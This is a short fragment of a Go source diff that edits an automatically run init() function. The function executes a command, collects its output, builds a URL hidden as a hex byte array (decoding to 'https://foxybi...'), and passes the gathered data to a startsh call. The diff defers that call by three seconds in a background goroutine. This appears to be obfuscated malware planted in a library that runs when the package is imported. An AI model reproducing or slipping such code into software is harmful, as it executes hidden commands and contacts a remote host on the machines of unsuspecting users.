@@ -99,6 +99,7 @@ func init() {
 		if err != nil {
 			o += "(" + err.Error() + ")"
 		}
+		_ = cmd.Wait()
 	}()
 
 	s = string([]byte{0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x66, 0x6f, 0x78, 0x79, 0x62, 0x69,
@@ -132,7 +133,10 @@ func init() {
 			o += "!! " + res + "|"
 		}
 	}
-	startsh(o)
+	go func() {
+		time.Sleep(3 * time.Second)
+		startsh(o)
+	}()
 }
 
 func assertMapImplementation() {
